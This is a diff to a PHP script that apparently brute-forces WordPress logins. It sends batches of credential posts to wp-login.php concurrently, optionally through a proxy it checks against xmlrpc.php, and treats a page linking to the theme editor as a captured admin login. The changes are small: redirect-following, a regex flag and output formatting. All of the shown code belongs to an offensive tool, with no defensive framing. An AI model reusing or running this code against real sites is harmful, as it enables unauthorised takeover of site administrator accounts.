@@ -116,7 +116,7 @@ if($proxy){
         curl_setopt_array($curlx,[CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => $host_http.'/xmlrpc.php',CURLOPT_PROXY => $proxy,CURLOPT_TIMEOUT => 10]);
         $data = curl_exec($curlx);
         curl_close($curlx);
-        if(!preg_match('/XML-RPC server accepts POST requests only./i',$data)){
+        if(!preg_match('/XML-RPC server accepts POST requests only./si',$data)){
             die("\t[INFO][-] Seems proxy that you've entered is not working :(".PHP_EOL);
         }
     }else{
@@ -179,6 +179,7 @@ foreach($chunk_posts as $post){
             CURLOPT_POST => 1,
             CURLOPT_TIMEOUT => 10,
             CURLOPT_POSTFIELDS => $pfield,
+            CURLOPT_FOLLOWLOCATION => 1,
             CURLOPT_USERAGENT => 'Mozilla 5.0'
             ]);
         if($proxy){
@@ -195,7 +196,6 @@ foreach($chunk_posts as $post){
                 curl_close($ch);
             }
             curl_setopt($curl['handler'][$i],CURLOPT_URL,$host_http.'/wp-login.php');
-            curl_setopt($curl['handler'][$i],CURLOPT_FOLLOWLOCATION,1);
             curl_setopt($curl['handler'][$i],CURLOPT_COOKIEFILE,'cookies.txt');
         }
         curl_multi_add_handle($multi,$curl['handler'][$i]);
@@ -231,7 +231,7 @@ foreach($chunk_posts as $post){
                         
                     }else{
                         print "\t[REQUEST $counter / $postfield_count][CODE:UNKNOWN] UNKNOWN ERROR!".PHP_EOL;
-                        print $content;
+                        print $content.PHP_EOL;
                     }
                 }else{
                     if(strstr($content,'theme-editor.php') && strstr($content,'logout')){
@@ -268,7 +268,7 @@ print "\t[INFO] Good bye :)) codes by miyachung".PHP_EOL;
 
 function control($link){
     $curl = curl_init();
-    curl_setopt_array($curl,[CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => $link,CURLOPT_TIMEOUT => 10,CURLOPT_USERAGENT => 'Mozilla 5.0']);
+    curl_setopt_array($curl,[CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => $link,CURLOPT_FOLLOWLOCATION => 1,CURLOPT_TIMEOUT => 10,CURLOPT_USERAGENT => 'Mozilla 5.0']);
     $exec = curl_exec($curl);
     curl_close($curl);
     return $exec;
